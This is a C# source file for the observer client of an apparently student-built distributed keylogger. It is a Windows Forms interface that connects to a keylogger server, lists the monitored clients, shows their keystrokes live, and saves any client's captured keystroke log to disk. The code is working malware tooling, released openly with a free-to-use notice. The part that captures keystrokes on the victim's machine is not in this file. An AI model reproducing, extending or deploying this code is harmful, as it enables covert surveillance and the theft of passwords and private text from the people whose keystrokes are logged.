/*************************************************************************
 *                                                                       *
 *  File:        FormClientObserver.cs                                   *
 *  Copyright:   (c) 2025, Glavan Pavel, Albu Sorin, Begu Alexandru,     *
 *                         Cojocaru Valentin                             *
 *  Website:     https://github.com/GlavanPavel/Keylogger                *
 *  Description: A Windows Forms interface that acts as an observer      *
 *               client in a distributed keylogger system. Connects to   *
 *               the keylogger server, displays keystrokes in real time, *
 *               supports downloading logs from selected clients, and    *
 *               provides a UI for managing observed sessions.           *
 *                                                                       *
 *  This code and information is provided "as is" without warranty of    *
 *  any kind, either expressed or implied, including but not limited     *
 *  to the implied warranties of merchantability or fitness for a        *
 *  particular purpose. You are free to use this source code in your     *
 *  applications as long as the original copyright notice is included.   *
 *                                                                       *
 *************************************************************************/


using System;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Reflection.Metadata;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Common;

namespace KeyloggerServer
{
    /// <summary>
    /// A Windows Forms observer client that connects to a keylogger server to display real-time keystroke data from selected clients.
    /// </summary>
    public partial class ClientObserver : Form
    {
        private TcpClient _client;
        private NetworkStream _stream;
        private CancellationTokenSource _cts;
        private string currentlySelectedClientId = null;

        /// <summary>
        /// Initializes a new instance of the <see cref="ClientObserver"/> class.
        /// </summary>
        public ClientObserver()
        {
            InitializeComponent();
        }

        /// <summary>
        /// Handles the Start button click to connect to the server as an observer and start receiving messages.
        /// </summary>
        /// <param name="sender">The source of the event (Start button).</param>
        /// <param name="e">The event data.</param>
        private async void buttonStart_Click(object sender, EventArgs e)
        {
            try
            {
                _cts = new CancellationTokenSource();
                _client = new TcpClient("localhost", 5000);
                _stream = _client.GetStream();

                // send handshake to identify as observer
                byte[] handshake = Encoding.UTF8.GetBytes("observer");
                await _stream.WriteAsync(handshake, 0, handshake.Length);

                AppendLog("Connected as observer. Listening for data...");

                _ = Task.Run(() => ListenLoop(_cts.Token));
                buttonStart.Enabled = false;
                buttonStop.Enabled = true;
            }
            catch (Exception ex)
            {
                var kex = new KeyloggerException("Connection error", ex);
                AppendLog(kex.ToString());
            }
        }

        /// <summary>
        /// Listens for messages from the server and handles incoming data asynchronously.
        /// </summary>
        /// <param name="token">The cancellation token to stop the listening loop.</param>
        private async Task ListenLoop(CancellationToken token)
        {
            byte[] buffer = new byte[1024];

            try
            {
                // keep listening until cancellation is requested
                while (!token.IsCancellationRequested)
                {
                    int bytesRead = await _stream.ReadAsync(buffer, 0, buffer.Length, token);
                    if (bytesRead == 0) break; // server disconnected

                    string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);

                    if (message.StartsWith("[LIST]"))
                    {
                        // server sent an updated list of client IDs
                        string[] ids = message.Substring(6).Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
                        UpdateClientList(ids); // update the UI with the new list
                    }
                    else if (message.StartsWith("[FILE]"))
                    {
                        string fileContent = message.Substring(6); // strip the "[FILE]" prefix

                        // ensure UI operations run on the main thread
                        if (this.InvokeRequired)
                        {
                            this.Invoke(new Action(() =>
                            {
                                using (SaveFileDialog saveFileDialog = new SaveFileDialog())
                                {
                                    saveFileDialog.Filter = "Text files (*.txt)|*.txt";
                                    saveFileDialog.FileName = currentlySelectedClientId.Replace(":", "_") + ".txt";

                                    if (saveFileDialog.ShowDialog() == DialogResult.OK)
                                    {
                                        File.WriteAllText(saveFileDialog.FileName, fileContent);
                                        AppendLog("File saved successfully.");
                                    }
                                }
                            }));
                        }
                    }
                    else if (message.StartsWith("[ERROR]"))
                    {
                        // server sent an error message
                        string errorMessage = message.Substring(7); // strip "[ERROR]"
                        AppendLog("Server error: " + errorMessage);

                        MessageBox.Show("Server error: " + errorMessage, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                    else if (message.StartsWith("["))
                    {
                        // message from a specific client, format: [clientId]content
                        int end = message.IndexOf(']');
                        string clientId = message.Substring(1, end - 1); // extract client ID
                        string content = message.Substring(end + 1);     // extract the message content

                        if (clientId == currentlySelectedClientId)
                            AppendMessage(content);
                    }
                }
            }
            catch (OperationCanceledException)
            {
                // listening loop was canceled
                AppendLog("Listening cancelled.");
            }
            catch (Exception ex)
            {
                var kex = new KeyloggerException("Error while receiving data from server.", ex);
                AppendLog(kex.ToString());
            }
        }

        /// <summary>
        /// Appends a message to the log textbox in a thread-safe manner.
        /// </summary>
        /// <param name="text">The log message to append.</param>
        private void AppendLog(string text)
        {
            if (InvokeRequired)
                BeginInvoke(new Action<string>(AppendLog), text);
            else
                textBoxLog.AppendText(text + Environment.NewLine);
        }

        /// <summary>
        /// Appends keystroke data to the message textbox in a thread-safe manner.
        /// </summary>
        /// <param name="msg">The keystroke message to append.</param>
        private void AppendMessage(string msg)
        {
            if (InvokeRequired)
                BeginInvoke(new Action<string>(AppendMessage), msg);
            else
                textBoxMessage.AppendText(msg);
        }

        /// <summary>
        /// Handles the Stop button click to stop the observer client and close the connection.
        /// </summary>
        /// <param name="sender">The source of the event (Stop button).</param>
        /// <param name="e">The event data.</param>
        private void buttonStop_Click(object sender, EventArgs e)
        {
            try
            {
                _cts?.Cancel();
                _stream?.Close();
                _client?.Close();

                AppendLog("Observer client stopped.");
            }
            catch (Exception ex)
            {
                var kex = new KeyloggerException("Error while stopping observer client.", ex);
                AppendLog(kex.ToString());
            }
            finally
            {
                buttonStart.Enabled = true;
                buttonStop.Enabled = false;
            }
        }

        /// <summary>
        /// Updates the list of connected client IDs in the UI.
        /// </summary>
        /// <param name="ids">The array of client IDs.</param>
        private void UpdateClientList(string[] ids)
        {
            if (listViewClients.InvokeRequired)
            {
                listViewClients.Invoke(new Action(() => UpdateClientList(ids)));
                return;
            }

            listViewClients.BeginUpdate();
            listViewClients.Items.Clear();

            foreach (var id in ids)
            {
                if (!string.IsNullOrWhiteSpace(id))
                {
                    listViewClients.Items.Add(new ListViewItem(id));
                }
            }

            listViewClients.EndUpdate();
        }

        /// <summary>
        /// Handles the event when a client is selected from the list view.
        /// </summary>
        /// <param name="sender">The source of the event (list view).</param>
        /// <param name="e">The event data.</param>
        private void listViewClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (listViewClients.SelectedItems.Count > 0)
            {
                currentlySelectedClientId = listViewClients.SelectedItems[0].Text;
                textBoxMessage.Clear();
                buttonDownload.Enabled = true;
            }
            else
            {
                currentlySelectedClientId = null;
                buttonDownload.Enabled = false;
            }
        }

        /// <summary>
        /// Sends a command to the server to request an updated list of clients.
        /// </summary>
        /// <param name="sender">The source of the event (Refresh List button).</param>
        /// <param name="e">The event data.</param>
        private async void buttonRefreshList_Click(object sender, EventArgs e)
        {
            try
            {
                if (_stream == null || !_client.Connected)
                {
                    MessageBox.Show("Not connected to server.");
                    return;
                }

                byte[] commandBytes = Encoding.UTF8.GetBytes("list\n");
                await _stream.WriteAsync(commandBytes, 0, commandBytes.Length);
                await _stream.FlushAsync();
            }
            catch (Exception ex)
            {
                var kex = new KeyloggerException("Failed to refresh client list.", ex);
                MessageBox.Show(kex.ToString());
            }
        }

        /// <summary>
        /// Sends a command to the server to download the keystroke file for the selected client.
        /// </summary>
        /// <param name="sender">The source of the event (Download button).</param>
        /// <param name="e">The event data.</param>
        private async void buttonDownload_Click(object sender, EventArgs e)
        {
            try
            {
                string command = "getfile " + currentlySelectedClientId + "\n";
                byte[] commandBytes = Encoding.UTF8.GetBytes(command);
                await _stream.WriteAsync(commandBytes, 0, commandBytes.Length);
                await _stream.FlushAsync();
            }
            catch (Exception ex)
            {
                var kex = new KeyloggerException("Failed to request file from server.", ex);
                MessageBox.Show(kex.ToString());
            }
        }

        /// <summary>
        /// Terminates the application when the Exit button is clicked.
        /// </summary>
        /// <param name="sender">The source of the event (Exit button).</param>
        /// <param name="e">The event data.</param>
        private void buttonExit_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        /// <summary>
        /// Opens the help file when the Help menu item is clicked.
        /// </summary>
        /// <param name="sender">The source of the event (Help menu item).</param>
        /// <param name="e">The event data.</param>
        private void helpToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Help.ShowHelp(this, "HELP.chm");
        }

        /// <summary>
        /// Displays information about the application when the "About" menu item is clicked.
        /// </summary>
        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string message = "Keylogger Observer Client\n" +
                             "Version 1.0.0\n" +
                             "© 2025 Glavan Pavel, Albu Sorin, Begu Alexandru, Cojocaru Valentin\n\n" +
                             "GitHub: https://github.com/GlavanPavel/Keylogger\n\n" +
                             "This software is provided 'as is' without warranty of any kind.";

            string caption = "About";
            MessageBox.Show(message, caption, MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

    }
}
